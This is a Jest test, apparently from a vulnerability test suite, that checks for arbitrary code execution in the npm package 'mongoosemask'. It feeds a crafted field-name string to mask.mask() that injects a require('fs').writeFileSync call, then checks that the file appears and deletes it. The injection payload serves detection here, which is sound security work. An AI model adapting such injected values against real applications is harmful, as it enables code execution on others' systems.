const v23 = () => {
    const v13 = expect.assertions(2);
    v13;
    const fs = require('fs');
    const mask = require('mongoosemask');
    const path = './mongoosemask';
    file_exist = fs.existsSync(path);
    const v14 = expect(file_exist);
    const v15 = v14.toBe(false);
    v15;
    try {
        const v16 = {};
        const v17 = ['id"]; require(`fs`)["writeFileSync"](`mongoosemask`,``)//'];
        const v18 = mask.mask(v16, v17);
        v18;
    } catch (error) {
    }
    file_exist = fs.existsSync(path);
    const v19 = expect(file_exist);
    const v20 = v19.toBe(true);
    v20;
    const v21 = function (err) {
    };
    const v22 = fs.unlink(path, v21);
    v22;
};
const v24 = test('Arbitrary code execution in mongoosemask', v23);
v24;